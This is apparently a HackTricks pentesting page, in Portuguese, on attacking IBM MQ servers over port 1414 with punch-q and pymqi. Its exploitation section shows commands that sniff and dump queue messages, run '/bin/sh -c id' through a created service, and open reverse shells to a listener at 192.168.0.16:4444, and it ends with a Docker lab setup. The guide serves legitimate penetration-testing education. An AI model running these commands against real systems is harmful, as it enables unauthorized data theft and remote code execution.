# 1414 - Pentesting IBM MQ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** **ğŸ¦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [repositÃ³rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## InformaÃ§Ãµes bÃ¡sicas

O IBM MQ Ã© uma tecnologia da IBM para gerenciar filas de mensagens. Como outras tecnologias de **corretor de mensagens**, Ã© dedicado a receber, armazenar, processar e classificar informaÃ§Ãµes entre produtores e consumidores.

Por padrÃ£o, **expÃµe a porta TCP IBM MQ 1414**.
Ã€s vezes, a API REST HTTP pode ser exposta na porta **9443**.
As mÃ©tricas (Prometheus) tambÃ©m podem ser acessadas na porta TCP **9157**.

A porta TCP IBM MQ 1414 pode ser usada para manipular mensagens, filas, canais, ... mas **tambÃ©m para controlar a instÃ¢ncia**.

A IBM fornece uma extensa documentaÃ§Ã£o tÃ©cnica disponÃ­vel em [https://www.ibm.com/docs/en/ibm-mq](https://www.ibm.com/docs/en/ibm-mq).

## Ferramentas

Uma ferramenta sugerida para exploraÃ§Ã£o fÃ¡cil Ã© o **[punch-q](https://github.com/sensepost/punch-q)**, com uso do Docker. A ferramenta estÃ¡ ativamente usando a biblioteca Python `pymqi`.

Para uma abordagem mais manual, use a biblioteca Python **[pymqi](https://github.com/dsuch/pymqi)**. SÃ£o necessÃ¡rias [dependÃªncias do IBM MQ](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA).

### Instalando pymqi

**DependÃªncias do IBM MQ** precisam ser instaladas e carregadas:

1. Crie uma conta (IBMid) em [https://login.ibm.com/](https://login.ibm.com/).
2. Baixe as bibliotecas do IBM MQ em [https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc). Para Linux x86_64 Ã© **9.0.0.4-IBM-MQC-LinuxX64.tar.gz**.
3. Descomprima (`tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz`).
4. Execute `sudo ./mqlicense.sh` para aceitar os termos de licenÃ§a.

>Se estiver no Kali Linux, modifique o arquivo `mqlicense.sh`: remova/comente as seguintes linhas (entre as linhas 105-110):
>
>```bash
>if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
>  then
>    echo "ERROR: This package is incompatible with this system"
>    echo "       This package was built for ${BUILD_PLATFORM}"
>    exit 1
>fi
>```

5. Instale esses pacotes:
```bash
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
```
6. Em seguida, adicione temporariamente os arquivos `.so` ao LD: `export LD_LIBRARY_PATH=/opt/mqm/lib64`, **antes** de executar outras ferramentas que utilizem essas dependÃªncias.

Em seguida, vocÃª pode clonar o projeto [**pymqi**](https://github.com/dsuch/pymqi): ele contÃ©m trechos de cÃ³digo interessantes, constantes, ... Ou vocÃª pode instalar a biblioteca diretamente com: `pip install pymqi`.

### Usando punch-q

#### Com Docker

Basta usar: `sudo docker run --rm -ti leonjza/punch-q`.

#### Sem Docker

Clone o projeto [**punch-q**](https://github.com/sensepost/punch-q) e siga o readme para instalaÃ§Ã£o (`pip install -r requirements.txt && python3 setup.py install`).

Depois, pode ser usado com o comando `punch-q`.

## EnumeraÃ§Ã£o

VocÃª pode tentar enumerar o **nome do gerenciador de filas, os usuÃ¡rios, os canais e as filas** com **punch-q** ou **pymqi**.

### Gerenciador de Filas

Ã€s vezes, nÃ£o hÃ¡ proteÃ§Ã£o contra a obtenÃ§Ã£o do nome do Gerenciador de Filas:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
```
### Canais

**punch-q** estÃ¡ usando uma lista de palavras interna (modificÃ¡vel) para encontrar canais existentes. Exemplo de uso:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
```
Acontece que algumas instÃ¢ncias do IBM MQ aceitam solicitaÃ§Ãµes MQ **nÃ£o autenticadas**, entÃ£o `--username / --password` nÃ£o Ã© necessÃ¡rio. Claro, os direitos de acesso tambÃ©m podem variar.

Assim que obtermos um nome de canal (aqui: `DEV.ADMIN.SVRCONN`), podemos enumerar todos os outros canais.

A enumeraÃ§Ã£o pode basicamente ser feita com este trecho de cÃ³digo `code/examples/dis_channels.py` do **pymqi**:
```python
import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

```
... Mas **punch-q** tambÃ©m incorpora essa parte (com mais informaÃ§Ãµes!).
Pode ser iniciado com:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
```
### Filas

Existe um trecho de cÃ³digo com **pymqi** (`dis_queues.py`), mas o **punch-q** permite recuperar mais informaÃ§Ãµes sobre as filas:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
```
## ExploraÃ§Ã£o

### Extrair mensagens

VocÃª pode direcionar fila(s)/canal(is) para farejar/extrair mensagens deles (operaÃ§Ã£o nÃ£o destrutiva). *Exemplos:*
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
```

```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
```
**NÃ£o hesite em iterar em todas as filas identificadas.**

### ExecuÃ§Ã£o de cÃ³digo

> Alguns detalhes antes de continuar: O IBM MQ pode ser controlado de vÃ¡rias maneiras: MQSC, PCF, Comando de Controle. Algumas listas gerais podem ser encontradas na [documentaÃ§Ã£o do IBM MQ](https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison).
> [**PCF**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=commands-introduction-mq-programmable-command-formats) (***Formatos de Comando ProgramÃ¡veis***) Ã© no que estamos focados para interagir remotamente com a instÃ¢ncia. **punch-q** e ainda **pymqi** sÃ£o baseados em interaÃ§Ãµes PCF.
>
> VocÃª pode encontrar uma lista de comandos PCF:
> * [Da documentaÃ§Ã£o PCF](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats), e
> * [de constantes](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes).
>
> Um comando interessante Ã© `MQCMD_CREATE_SERVICE` e sua documentaÃ§Ã£o estÃ¡ disponÃ­vel [aqui](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms). Ele recebe como argumento um `StartCommand` apontando para um programa local na instÃ¢ncia (exemplo: `/bin/sh`).
>
> TambÃ©m hÃ¡ um aviso sobre o comando na documentaÃ§Ã£o: *"AtenÃ§Ã£o: Este comando permite que um usuÃ¡rio execute um comando arbitrÃ¡rio com autoridade mqm. Se concedidos direitos para usar este comando, um usuÃ¡rio malicioso ou descuidado poderia definir um serviÃ§o que danifica seus sistemas ou dados, por exemplo, excluindo arquivos essenciais."*
>
> *Nota: sempre de acordo com a documentaÃ§Ã£o do IBM MQ (ReferÃªncia de AdministraÃ§Ã£o), tambÃ©m hÃ¡ um endpoint HTTP em `/admin/action/qmgr/{qmgrName}/mqsc` para executar o comando MQSC equivalente para a criaÃ§Ã£o de serviÃ§o (`DEFINE SERVICE`). Este aspecto ainda nÃ£o estÃ¡ coberto aqui.*

A criaÃ§Ã£o / exclusÃ£o de serviÃ§o com PCF para execuÃ§Ã£o remota de programa pode ser feita pelo **punch-q**:

**Exemplo 1**
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
```
> Nos logs do IBM MQ, vocÃª pode ler que o comando foi executado com sucesso:
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: O comando '808544aa7fc94c48' foi iniciado. ProcessId(618). [ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```
>
> VocÃª tambÃ©m pode enumerar os programas existentes na mÃ¡quina (aqui `/bin/doesnotexist` ... nÃ£o existe):
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
```
**Tenha em mente que o lanÃ§amento do programa Ã© assÃ­ncrono. Portanto, vocÃª precisa de um segundo item para aproveitar a exploraÃ§Ã£o** ***(ouvinte para shell reverso, criaÃ§Ã£o de arquivo em serviÃ§o diferente, exfiltraÃ§Ã£o de dados atravÃ©s da rede ...)***

**Exemplo 2**

Para um shell reverso fÃ¡cil, **punch-q** propÃµe tambÃ©m dois payloads de shell reverso:

* Um com bash
* Um com perl

*Claro que vocÃª pode construir um personalizado com o comando `execute`.*

Para bash:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
Para perl:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
### PCF Personalizado

VocÃª pode explorar a documentaÃ§Ã£o do IBM MQ e usar diretamente a biblioteca **pymqi** em Python para testar comandos PCF especÃ­ficos nÃ£o implementados no **punch-q**.

**Exemplo:**
```python
import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

```
Se nÃ£o conseguir encontrar os nomes das constantes, vocÃª pode consultar a [documentaÃ§Ã£o do IBM MQ](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqca-character-attribute-selectors).

> *Exemplo para [`MQCMD_REFRESH_CLUSTER`](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster) (Decimal = 73). Ele precisa do parÃ¢metro `MQCA_CLUSTER_NAME` (Decimal = 2029) que pode ser `*` (Doc: ):*
>
> ```python
> import pymqi
>
> queue_manager = 'MYQUEUEMGR'
> channel = 'DEV.ADMIN.SVRCONN'
> host = '172.17.0.2'
> port = '1414'
> conn_info = '%s(%s)' % (host, port)
> user = 'admin'
> password = 'passw0rd'
>
> qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
> pcf = pymqi.PCFExecute(qmgr)
>
> try:
>     args = {2029: "*"}
>     response = pcf.MQCMD_REFRESH_CLUSTER(args)
> except pymqi.MQMIError as e:
>     print("Erro")
> else:
>     print(response)
>
> qmgr.disconnect()
> ```

## Ambiente de Teste

Se deseja testar o comportamento e exploits do IBM MQ, pode configurar um ambiente local com base no Docker:

1. Ter uma conta em ibm.com e cloud.ibm.com.
2. Criar um IBM MQ em container com:
```bash
sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
```
Por padrÃ£o, a autenticaÃ§Ã£o estÃ¡ habilitada, o nome de usuÃ¡rio Ã© `admin` e a senha Ã© `passw0rd` (VariÃ¡vel de ambiente `MQ_ADMIN_PASSWORD`).
Aqui, o nome do gerenciador de filas foi definido como `MYQUEUEMGR` (variÃ¡vel `MQ_QMGR_NAME`).

VocÃª deve ter o IBM MQ em execuÃ§Ã£o e com suas portas expostas:
```bash
â¯ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414->1414/tcp, 0.0.0.0:9157->9157/tcp, 0.0.0.0:9443->9443/tcp   testing-ibmmq
```
> A versÃ£o antiga das imagens do Docker do IBM MQ estÃ¡ em: https://hub.docker.com/r/ibmcom/mq/.

## ReferÃªncias

* [Gist do mgeeky - "Notas prÃ¡ticas de teste de penetraÃ§Ã£o do IBM MQ"](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec)
* [MQ Jumping - DEFCON 15](https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf)
* [DocumentaÃ§Ã£o do IBM MQ](https://www.ibm.com/docs/en/ibm-mq)
